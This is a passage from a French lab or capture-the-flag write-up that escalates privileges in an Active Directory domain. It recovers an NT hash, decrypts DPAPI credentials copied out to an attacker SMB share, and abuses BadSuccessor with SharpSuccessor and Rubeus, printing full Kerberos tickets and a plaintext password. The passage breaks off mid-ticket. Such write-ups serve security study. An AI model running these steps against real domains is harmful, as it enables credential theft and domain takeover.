+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>[*] Generating certificate
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>[*] Certificate generated
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>[*] Generating Key Credential
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>[*] Key Credential generated with DeviceID &#39;6f54e71b-36b6-d118-f042-2279e54006d6&#39;
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>[*] Adding Key Credential with device ID &#39;6f54e71b-36b6-d118-f042-2279e54006d6&#39; to the Key Credentials for &#39;hades&#39;
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>[*] Successfully added Key Credential with device ID &#39;6f54e71b-36b6-d118-f042-2279e54006d6&#39; to the Key Credentials for &#39;hades&#39;
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>[*] Authenticating as &#39;hades&#39; with the certificate
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>[*] Using principal: hades@pantheon.god
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>[*] Trying to get TGT...
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>[*] Got TGT
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>[*] Saved credential cache to &#39;hades.ccache&#39;
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>[*] Trying to retrieve NT hash for &#39;hades&#39;
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>[*] Restoring the old Key Credentials for &#39;hades&#39;
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>[*] Successfully restored the old Key Credentials for &#39;hades&#39;
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>[*] NT hash for &#39;hades&#39;: ead49bdbe3311143eeafbcb14d8ae126
+</code></pre></div>
+<ul>
+<li>
+<p>Avec <code>WinPEAS</code>, on trouve qu’il y a des credentials dans la <code>dpapi</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>cmdkey<span class="w"> </span>/add:pantheon.god<span class="w"> </span>/user:hera<span class="w"> </span>/pass:<span class="s2">&quot;Qu33n0fG0ds!2024&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>ls<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Credentials&quot;</span><span class="w"> </span>-Fo
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ls<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Protect&quot;</span><span class="w"> </span>-Fo
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>ls<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\h</span>ades<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials<span class="se">\ </span>-Fo
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>ls<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\h</span>ades<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\ </span>-Fo<span class="w"> </span>-Re
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Protect\*&quot;</span><span class="w"> </span>-Fo
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Credentials&quot;</span><span class="w"> </span>-Fo
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Credentials\*&quot;</span><span class="w"> </span>-Fo
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Protect\*&quot;</span><span class="w"> </span>-Fo<span class="w"> </span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1">#server</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>share<span class="w"> </span>.
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c1">#Client</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>copy<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Credentials\B220D0D6995B10FC4B5718D982AB1B0A&quot;</span><span class="w"> </span><span class="se">\\</span><span class="m">192</span>.168.56.1<span class="se">\\</span>share<span class="se">\\</span>credential
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>copy<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Protect\S-1-5-21-20107180-75155701-1075408035-1133\e2fb222d-1757-4b92-9fd7-094e19c608f7&quot;</span><span class="w"> </span><span class="se">\\</span><span class="m">192</span>.168.56.1<span class="se">\\</span>share<span class="se">\\</span>masterkey
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>dpapi.py<span class="w"> </span>credential<span class="w"> </span>-file<span class="w"> </span>credentials<span class="w"> </span>-key<span class="w"> </span>masterkey
+</code></pre></div>
+</li>
+</ul>
+<p>Avec un genericALL sur une OU il y a un <code>Windows Server 2025</code> une vulnérabilité récente au moment ou j’écris ce writeup du nom de <code>BadSuccessor</code> peut être exploiter. </p>
+<p>Pour des raison que j’ignore elle ne peux pas êter exploiter directement sur le <code>DC</code>, mais on peux l’exploiter sur une machine jointe au domaine, ce qui tombe bien car dans notre environnement il y a une autre machine <code>pantheon-enfers.pantheon.god</code> à la quel <code>hades</code> peut ce connecter à distance.</p>
+<p>Le problème c’est qu’il va nous falloir une session <code>RDP</code> pour effectuer cette exploit. Mais nous n’avons pas le mdp de hades. 
+Le hash pourrait être utiliser pour ce connecter en RDP si il été administrateur local de la machine, ce qui n’est pas le cas. 
+Cependant ce dernier à un généricALL sur tout les objet de l’OU <code>ENFERS</code> dont <code>orphee</code> qui peut rdp sur la machine <code>pantheon-enfers.pantheon.god</code>.</p>
+<p>On donne donc un genericALL sur une <code>OU</code> à orphee pour qu’il puisse exploiter <code>badsuccessor</code> à la place de hades.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>hades@pantheon.god<span class="o">][</span>Jun<span class="w"> </span><span class="m">26</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span>-<span class="w"> </span><span class="m">02</span>:38:28<span class="w"> </span><span class="o">(</span>CEST<span class="o">)]</span><span class="w"> </span>exegol-pantheon_wu<span class="w"> </span>bloodhound<span class="w"> </span><span class="c1"># stobject &quot;OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD&quot;</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>TargetObject<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;OU=ENFERS,DC=PANTHEON,DC=GOD&#39;</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="o">[</span>hades@pantheon.god<span class="o">][</span>Jun<span class="w"> </span><span class="m">26</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span>-<span class="w"> </span><span class="m">02</span>:39:13<span class="w"> </span><span class="o">(</span>CEST<span class="o">)]</span><span class="w"> </span>exegol-pantheon_wu<span class="w"> </span>bloodhound<span class="w"> </span><span class="c1"># stcontrolledprincipal orphee</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>ControlledPrincipal<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;orphee&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DC_IP</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;:</span><span class="nv">$NT_HASH</span><span class="s2">&quot;</span><span class="w"> </span>add<span class="w"> </span>genericAll<span class="w"> </span><span class="nv">$TargetObject</span><span class="w"> </span><span class="nv">$ControlledPrincipal</span>
+</code></pre></div>
+<p>Il va nous falloire compiler le binaire <code>SharpSuccessor.exe</code> et <code>Rubeus.exe</code> dans sa version 2.3.3 minimum : </p>
+<p><a href="https://github.com/logangoins/SharpSuccessor">https://github.com/logangoins/SharpSuccessor</a></p>
+<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>*Evil-WinRM* PS C:\Users\hades\Documents&gt; upload /workspace/writeup/exploit/SharpSuccessor.exe
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>*Evil-WinRM* PS C:\Users\hades\Documents&gt; upload /workspace/writeup/exploit/Rubeus.exe
+</code></pre></div>
+<p>Premièrement on va crée un un dMSA sur l’OU ENFERS sur la quel nous avons un droit <code>createChild</code>avec <code>SharpSuccessor.exe</code> </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>PS C:\Users\hades\Desktop&gt; .\SharpSuccessor.exe add /impersonate:Administrator /path:&quot;OU=ENFERS,DC=PANTHEON,DC=GOD&quot; /account:orphee /name:pwned_dMSA
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>   _____ _                      _____
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>  / ____| |                    / ____|
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a> | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>  \___ \| &#39;_ \ / _` | &#39;__| &#39;_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| &#39;__|
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a> |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>                         | |
+<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>                         |_|
+<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>@_logangoins
+<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>
+<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>[+] Adding dnshostname pwned_dMSA.pantheon.god
+<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>[+] Adding samaccountname pwned_dMSA$
+<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>[+] Administrator&#39;s DN identified
+<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>[+] Attempting to write msDS-ManagedAccountPrecededByLink
+<a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>[+] Wrote attribute successfully
+<a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>[+] Attempting to write msDS-DelegatedMSAState attribute
+<a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>[+] Attempting to set access rights on the dMSA object
+<a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>[+] Attempting to write msDS-SupportedEncryptionTypes attribute
+<a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>[+] Attempting to write userAccountControl attribute
+<a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>[+] Created dMSA object &#39;CN=pwned_dMSA&#39; in &#39;OU=ENFERS,DC=PANTHEON,DC=GOD&#39;
+<a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>[+] Successfully weaponized dMSA object
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>PS C:\Users\hades\Desktop&gt; .\Rubeus.exe tgtdeleg /nowrap
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>   ______        _
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>  (_____ \      | |
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>   _____) )_   _| |__  _____ _   _  ___
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>  |  __  /| | | |  _ \| ___ | | | |/___)
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>  |_|   |_|____/|____/|_____)____/(___/
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>  v2.3.3
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>[*] Action: Request Fake Delegation TGT (current user)
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a>[*] No target SPN specified, attempting to build &#39;cifs/dc.domain.com&#39;
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>[*] Initializing Kerberos GSS-API w/ fake delegation for target &#39;cifs/pantheon-dc01.pantheon.god&#39;
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>[+] Kerberos GSS-API initialization success!
+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a>[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+<a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a>[*] Found the AP-REQ delegation ticket in the GSS-API output.
+<a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a>[*] Authenticator etype: aes256_cts_hmac_sha1
+<a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a>[*] Extracted the service ticket session key from the ticket cache: HMqUhWU8WupaHB+glfk5VQUV9llzHa876Aa0XuGFLPo=
+<a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a>[+] Successfully decrypted the authenticator
+<a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a>[*] base64(ticket.kirbi):
+<a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a>
+<a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a>      doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDFBBTlRIRU9OLkdPRKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFOVEhFT04uR09Eo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDaY/IXr0VvYXbwRSdf+G7rmOdF6WwntJQoDum/IbgJIZlsnJuObYMvrTZ0DukrhXP6pp4dbIoiidATPFAzwsy9pYbmtUHnvCm3xabKjxeRbQq9Xo9tKOX2qhqJvcElWSCkVDA0KBNY/bs4WCmF1ACKUoDYIHszQfCUUY7JVTpLmO7olQfNnpyv4NA/tOpfMmo4lXCJufIy81c76OtKpk2g46lhJbcWVZaE6y/21C9bahCQLC3Om/5i36lQS5mlE5P61zXy2K2EjOA+Q9mcvfTumgWApaQrDPP2z5dYmhcB5TMJN+5IZgxL/xLu3BS367V+0AKGhz9SREUhpWO7BSyvGb/ZlgE3hRcc3R14YDVOWJeDqhVr6/D+6C4+NaFCWsN4VKN8aLLFwSCU97Vkdvclqs08f4iZ54CR6I59UW82iPa1O5K4bX+O9kGd60t/h1+mHnmKt4MN8ORlLlqDzDen1IAdn4RS1/IHg0FySO1OtqGxY653iesKbbfIUkAiapfGKlapDD03JbduODmZCsCoJ9aS31n1+Qob3CgEO3rOjyKp2uHsaYV7jrxbeIkiyXB3AH/kLvGNhkNfZCj2MEWqoS7R+BIV7KTPUD25NH3pb/GKZzHY4ua22J2ipF/Wl6CGVb2JTzw8Te2/Jf6geVnBsQpV+JkPYC32xZEr+za2o2u0QytniaxSZXqVykhZjCXMPmi4RA20Jar22PRVa6YTKkv1yt2/DAepugQEEHC+/StwMANmXHF7YbzlQSMeUQCmYV2wv+/fmFHp2n59F9evY8DAXWid8QUG9wGEAURvDbAsT7D0EcBYBqXL2Kj2LoKplVeif7Yc/WIPyiXE8EHl75MFB+isIdTUcZkLrETlh6sUR1ei7HvS4Q4KPjN9viFS5IutxMwWmiYwNbtTkPaPZ7B4o+GuX5p5oMYzYeI/eQ/vQ7LERSv3QHsr0L2kqBS4HPU+kdRxLy6c/VDjtESdDAb7vQjfdpgyBoAyZFfHmBK6bIk0H4uucI273xyVZFbZ0zWy0EHzrm5kIyaQL2ECLmHr8n2gwpMQ7trN4sbf0IeAV8WM20+pQ3D5Arc1CceH+IL1fIoUbErRbbnTSNI4qb620y7GiJ9MzVL+z04prviulKeKGEDWzu7I3h7/Gi7oygDsQmrMlUvXLrT0nVyuMMLP1WZBJI1JBXlDkziQckwuoArGy1ZvhyHUb0fyplTW05Rl1YBdcegbn/eLgD/xt558H1KDdvhkoscVlKEvNKTFjbcJkiESJrIreUP5vaElcg1FV6JCuFXZCgF+p1GZS/n7YGSwOJ9f+PPeYrr4DejNIPmfzdXlx34JfsXzQUaBOEotfUQnUU9eRkzSZtp09/SZvs5HTTKBrVc8ySrWfccpHKsqYknIiAiepCY2ZpjzgUjSBLLOl1Brii8D4uH6MJBkQrAUso4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgFLSEDL2+vdNw2peo8khxhS1IS+pJa2UBSm2WMU3CzyChDhsMUEFOVEhFT04uR09EohIwEKADAgEBoQkwBxsFaGFkZXOjBwMFAGChAAClERgPMjAyNTA2MjExMTU3MjNaphEYDzIwMjUwNjIxMjE1NjM3WqcRGA8yMDI1MDYyODExNTYzN1qoDhsMUEFOVEhFT04uR09EqSEwH6ADAgECoRgwFhsGa3JidGd0GwxQQU5USEVPTi5HT0Q=
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>PS C:\Users\hades\Desktop&gt; .\Rubeus.exe asktgs /targetuser:pwned_dMSA$ /service:krbtgt/pantheon.god /opsec /dmsa /nowrap /ptt /ticket:doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDFBBTlRIRU9OLkdPRKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFOVEhFT04uR09Eo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDY0lRuxN5TRUtZZ5p1HdpRVdHLfSSQMtI1oYS2Dk1zJjFJirGGJAHokqeRc0dQrevSqBiNQFZ5ZF6K6fEc/WLKpUPp6g+iZHjMNkoFdVLi3llL8bsmNLIv3xEiGWv7vBWXFDBrpWx6fP2XCaPnEjZAqrZTg/kdjtOnOwqVWx0jFERU5n/+d7U2iwq1B2gPpGzMIBeD0TiYk0pnXvBQhQ/I3VlmZKQQ2+ko5DyTwEmvJ9b9Il+2Y7MvpblzS7ZOKzGuNpDvAl6+L80e7dNjz+GCkxtgN71/gxfDEgQXW3E9JXmXiE5W0cZjbEcmPQd0lMag1Jjui2uRmpABVh9wHq35QuN5bWDjseFBLPHGc0/H9SQ1DQdWk83H/UsUdQ0BRqdOLXAig1uwVDTr0eNP7trmRU+OM8hYl2n6/eqnsb0GQ6OyuixBq9nPQu8xC7a5lg3OgICSpsuyzIh0EBWVvNRYgSz2kFwQgKrS6SyrOQgzTXjC/iN1qZn3FGHF2xCFunffmcT3NLXaVnLAEic4RjhBR5GPAhRx4fcAF12ywNoOBX0e9ZfzEKgyz8vOuXa86LQeZpjWiRH6XPgy6d4rISvUtaqysDxFXrT0SKjleahtwu9jjLPOtQyhKMRRjEPaP3CfCs9o4qE6zxPi84iM3CXMYRpFKxDZLSytKFbMDs57h+FELwVlldnDAx28R0iRPr7cEB9amSo7E153tNIuTCc9Pi+zLlzp5gKEmIfn3lPX85XlZgP6Xcb+MrUszzZjQSftTOR6iKhtBqmjqcg5PqfeHNf37ozTrC2y4QEmgdk6bbtfPFFrgPVsDBox3KxQ9RyehC7flS1lmMGqXkiuVlW7hf5MmK8nOd+NT3Fc3Ru0BOk11HP/4Ey6MS4YYl+DiijwzpnsV7wsexV4ZeUMpUZsQML20Oz4zGJdFYZbDvNex7UNXTF67GEBKUZ6DCaI5u1wu4rpnio980qWHGGvZpffAgMMN0/75OrxRx7A3ex0JziJGKl7mYx4G9cE4TqPULBucWRbFXrlye66ErJynU32q+OkUZT8T73RCbOQiP0fF2sJn8jibDQNBpjpWsihZ6/dpiGE5VDvM8z/bfWIzW9fdngXZdy4AKZBWrkGqAbDZ4m3QynqeQN17Hddr8IduuRZtLY14EVkAQb/as7RtGPVsezAkWFulYdEWN+nvdg/lcAXI0H1oD1tqjnKggsPn7fmviRON3mhoc06/6e014ZQqC0v2UsyX8THF39b5XPbKsMxpH0nB02ylkpoCXpMBaNvS5qgZz8s9PkZpO6zOCU6jXZFTy/cP7rYdSvJCwP+aunMNCMikUVv3yplqvDwNVeSVGYqGjh7b7TFNhW2e7TWrdwjh0y/HyOF7r9W/hyYdq3/KCUwr/VAvc0AssKxIITGVu40Kqbh0V8CDn4lfyTIc/vbYMOcuo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgB1IFfI8U0q+NLYeGtCaKV+tZ869EwB13phVfpJdvG4ShDhsMUEFOVEhFT04uR09EohIwEKADAgEBoQkwBxsFaGFkZXOjBwMFAGChAAClERgPMjAyNTA2MjExOTM5MDJaphEYDzIwMjUwNjIyMDUzOTAxWqcRGA8yMDI1MDYyODE5MzkwMVqoDhsMUEFOVEhFT04uR09EqSEwH6ADAgECoRgwFhsGa3JidGd0GwxQQU5USEVPTi5HT0Q=
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>   ______        _
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>  (_____ \      | |
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>   _____) )_   _| |__  _____ _   _  ___
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>  |  __  /| | | |  _ \| ___ | | | |/___)
+<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
+<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>  |_|   |_|____/|____/|_____)____/(___/
+<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
+<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>  v2.3.3
+<a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>
+<a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>[*] Action: Ask TGS
+<a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>
+<a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+<a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>[*] Building DMSA TGS-REQ request for &#39;pwned_dMSA$&#39; from &#39;orphee&#39;
+<a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>[+] Sequence number is: 1951566350
+<a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>[*] Using domain controller: pantheon-dc01.pantheon.god (192.168.56.11)
+<a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>[+] TGS request successful!
+<a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>[+] Ticket successfully imported!
+<a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>[*] base64(ticket.kirbi):
+<a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>
+<a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>      doIF6DCCBeSgAwIBBaEDAgEWooIE6jCCBOZhggTiMIIE3qADAgEFoQ4bDFBBTlRIRU9OLkdPRKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFOVEhFT04uR09Eo4IEojCCBJ6gAwIBEqEDAgECooIEkASCBIypzjKyr705ba1b+W14U/2LJKiktg4GXtKMbdiEq2z/bSxUbJL9Bc22zMhYutgY4iJCn8bWJAjamwN2RcV2NV9c8SyDaJXKUY8CGOgG2+2Un33EKtQDSN5xD2VTrKBbgJJYmNyHZQinXvGxRdnOUDi8ANLCXDloIK1Q/yOBXpxPJkIL7iEJYZocQrqSjMjt6nFccwMIQ/QuCrSRF2c5mdOTxgBF80kRSl4D9eVn/g2bEXiuKy22Pf+idzQpnI9cFx11CkJTSgPHj4EjM7tXgPUr8zM9BxgbBDPusqyq0dz5ZqcLlrFDlrdF8PHt/QIOt2rVrfAkBlItUy9GATCzqfmNP+9G+C79yNKeS7tsKMkpvnlQ3w7ZWhlKavu6wjTz/kHbR2V7EPhF6gjT8ih7hmzH92alK74IAtgh/2je3lYsfdFNNcXqwRc3vhbpXJmrA83WZwWDkMP4rZlAcONiWDwhFT0DH0Z3zYXgzyozJ89FtLY3zluz1SjJbetmAX3PUmL3LQUvlQaQfZbxdMy3L5mf7j2bYrDH6S2oaiCDI4s/Gu4jfH7ppiL4xD6lEWAC8COpoZGGL3lZcAJ3onj3Qiha9p1G8y1J3QOPLZMa28DvOXrAdTHsPJKp9HIuoaglk4VhorqnfIFLgnVm2kHbS1ZFAfEQM/Ds8XG54XyUs0iKcJBBy+5p1gvMMPOx8/rEb/a6PWM8rlv3KU+zuXI5/Ef0tE98r+52AdkHz9hsuPvfctjqDnA/xp9vt0UA6lnAtE8GxniQILPjwVDOP8j1RK4SUFojdTXsJLeNmF1gKRE7dcWqeZre2HNt0gLnz/U/2tDwV+duoBMSre33+3ZHJkoLKUfYciR9d5PzQvl2AZuKMayp345j87rQCns9KCR7rvb5kesZZ/IpzmAkIWd5npBN3lK+o0NR3t4jrkqixQR2vQifqox6i+qf4mCiBTvPOx1/WiQsIL/Ch7uox0LuBwNEK4iR8Ahx0NadA/MSGv8WlbmZc+TASIF0Oa/BOR4BXx0asQUIyCxp2wG8SiGi97lmC+c/kiDFDpXe82EiXDinitWcgHal0Bcx6WwnSCqvl5rL5Gb+zNhZ/Pymzvq3mOPmy1udd+Pd4CQkCAEV2gzRaEnmgeuL7EtHOghaMp2Z70tdFUzm4Gb3qjBaHzZvjQH56J3l0t5ck/KfTrn8BpZplXevVSq7wCx/c/TSJmjMlUCVUXBPG071hMLIh20DGGPUBCwI6219x8GltUp+yikmBj3SopfooPntUg6HtKQWp8o5KrZNwjwKgoBfO5l39i16CpOa68jnoCgNd8lgTAT20v1eo2nOsbEBbIb2YhzDcp6nl4+n1wftRp97EbOHF5pKJUG93tPHBpXNiLq+w8lL3xk47Y7i6LqLSjYVBRjoVY6g/UHGny9MA